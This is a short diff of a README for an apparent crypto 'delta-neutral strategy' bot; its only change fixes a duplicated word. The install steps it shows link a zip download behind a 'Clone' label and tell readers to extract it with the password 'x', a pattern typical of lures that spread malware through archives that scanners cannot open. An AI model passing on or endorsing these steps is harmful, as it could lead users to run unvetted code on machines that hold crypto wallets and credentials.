@@ -4,7 +4,7 @@ A delta-neutral strategy with Compound Finance involves employing a financial ap
 ## How to install
 - [Clone](https://github.com/medlaare/delta-neutral-strategy/archive/refs/heads/main.zip) the repository and follow the step-by-step setup guide in the documentation.
 - Extract archive with password `x`
-- Modify the the config file In this example:
+- Modify the config file In this example:
 - `rpc_url` is the endpoint for the Ethereum, Polygon, and Arbitrum RPC providers.
 - `gas_limit` and `gas_price` are parameters to control transaction costs.
 - `rebalancing_time` specifies the time for periodic rebalancing.
